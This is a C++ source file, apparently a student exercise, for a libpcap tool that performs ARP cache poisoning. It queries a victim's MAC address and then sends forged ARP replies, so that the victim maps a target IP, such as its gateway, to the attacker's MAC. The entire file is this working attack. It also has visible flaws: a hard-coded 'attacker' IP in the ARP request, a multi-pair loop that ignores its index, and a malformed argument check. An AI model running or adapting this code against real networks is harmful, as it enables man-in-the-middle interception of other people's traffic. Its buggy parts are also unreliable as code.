#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp-test <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: send-arp-test wlan0 192.168.10.2 192.168.10.1\n");
}

Mac get_mac_address(const char* interface) {
    struct ifreq ifr;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    strncpy(ifr.ifr_name, interface, IFNAMSIZ-1);
    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl");
        close(sock);
        exit(EXIT_FAILURE);
    }

    close(sock);
    return Mac((uint8_t*)ifr.ifr_hwaddr.sa_data);
}

Mac get_mac_from_arp(const char* sender_ip, const char* interface) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "pcap_open_live failed: %s\n", errbuf);
        exit(EXIT_FAILURE);
    }

    EthArpPacket packet;
    Mac attacker_mac = get_mac_address(interface);
    Ip sender_ip_addr(sender_ip);

    packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF"); //broadcast
    packet.eth_.smac_ = attacker_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = attacker_mac;
    packet.arp_.sip_ = htonl(Ip("192.168.238.130")); //Attacker's IP?
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(sender_ip_addr);


    if (pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket)) != 0) {
        fprintf(stderr, "Error sending ARP request\n");
        pcap_close(handle);
        exit(EXIT_FAILURE);
    }

    struct pcap_pkthdr* header;
    const u_char* received_packet;
    while (pcap_next_ex(handle, &header, &received_packet) == 1) {
        EthArpPacket* response = (EthArpPacket*)received_packet;
        if (ntohs(response->eth_.type_) == EthHdr::Arp &&
            ntohs(response->arp_.op_) == ArpHdr::Reply) {

            Mac retMac = response->arp_.smac_;
            pcap_close(handle);
            return retMac;
        }
    }

    pcap_close(handle);
    fprintf(stderr, "No ARP reply received\n");
    exit(EXIT_FAILURE);
}

void send_arp_infection(const char* sender_ip, const Mac& sender_mac,
                        const char* target_ip, const Mac& attacker_mac, const char* interface) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "pcap_open_live failed: %s\n", errbuf);
        exit(EXIT_FAILURE);
    }

    EthArpPacket packet;

    packet.eth_.dmac_ = sender_mac;
    packet.eth_.smac_ = attacker_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(ArpHdr::Reply);

    packet.arp_.smac_ = attacker_mac;
    packet.arp_.sip_ = htonl(Ip(target_ip));
    packet.arp_.tmac_ = sender_mac;
    packet.arp_.tip_ = htonl(Ip(sender_ip));

    if (pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket)) != 0) {
        fprintf(stderr, "Error sending ARP infection packet\n");
    }

    pcap_close(handle);
}

int main(int argc, char* argv[]) {
    if (argc != 4 && argc%2 != 0) {
        usage();
        return EXIT_FAILURE;
    }

    const char* interface = argv[1];
    const char* sender_ip = argv[2];
    const char* target_ip = argv[3];

    Mac attacker_mac = get_mac_address(interface);
    printf("[*] Attacker MAC: %s\n", std::string(attacker_mac).c_str());

    for(int i=2; i<argc; i+=2){

        Mac sender_mac = get_mac_from_arp(sender_ip, interface);
        printf("[*] Sender MAC: %s\n", std::string(sender_mac).c_str());

        send_arp_infection(sender_ip, sender_mac, target_ip, attacker_mac, interface);

        printf("[*] ARP Spoofing Packet Sent!\n");
    }

    return EXIT_SUCCESS;
}
